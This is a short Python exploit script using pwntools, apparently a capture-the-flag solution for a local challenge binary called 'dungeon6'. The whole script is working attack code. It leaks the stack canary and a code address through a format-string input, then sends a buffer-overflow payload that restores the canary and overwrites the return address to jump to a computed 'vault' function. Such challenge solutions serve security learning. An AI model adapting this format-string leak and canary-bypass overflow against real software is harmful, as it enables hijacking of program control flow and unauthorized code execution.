from pwn import *

exe = './dungeon6'
elf = context.binary = ELF(exe, checksec=False)
io = process(exe)

offset = "A" * 72

io.sendlineafter(b'!', '%15$p.%21$p'.encode())
io.recvline()
leaked = io.recvline().strip().decode()
canary = int(leaked.split('.')[0], 16)  # Canary is at the 15th place
leaked_address = int(leaked.split('.')[1], 16)  # Leaked address is at the 21st place

info('Leaked Address: 0x%x', leaked_address)
info('Canary: 0x%x', canary)

vault_address = leaked_address - 0x100

info('New vault address: 0x%x', vault_address)

payload = flat([
    offset.encode(),  # Pad to canary
    p64(canary, endianness='little', sign='unsigned'),   # Leaked Canary
    8 * b'A',      # Pad to Ret Pointer
    p64(vault_address, endianness='little', sign='unsigned')  # New vault address
])

io.clean()
io.sendline(payload)

banner = io.read(1024)
print(banner)

